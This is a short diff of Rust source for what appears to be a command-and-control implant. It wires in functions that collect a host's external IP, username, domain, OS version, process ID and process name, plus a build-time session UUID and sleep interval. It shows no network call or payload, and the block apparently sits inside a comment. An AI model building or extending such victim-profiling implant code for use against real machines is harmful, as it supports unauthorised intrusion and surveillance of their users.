@@ -36,13 +36,13 @@ pub extern "system" fn Pick() {
 /* 
     let imp_info = ImpInfo {
         session: env!("UUID").to_string(), //grabs the UUID from the environment used to build the implant
-        ip: get_external_ip(),        //replace with real get_external_ip function
-        username: get_username(),          //get the username
+        ip: func::get_external_ip(ntdll, kernel32),        //replace with real get_external_ip function
+        username: func::get_username(),          //get the username
         //hardcode domain for now as TODO
-        domain: "TODO".to_string(),
+        domain: func::get_system_domain(),
         os: func::get_version(ntdll),  //get the os version
-        imp_pid: get_pid(), //get the process id
-        process_name: get_process_name(),
+        imp_pid: func::get_pid(), //get the process id
+        process_name: func::get_process_name(kernel32),
         sleep: env!("SLEEP").to_string(), //grabs the SLEEP from the environment used to build the implant
     };
 
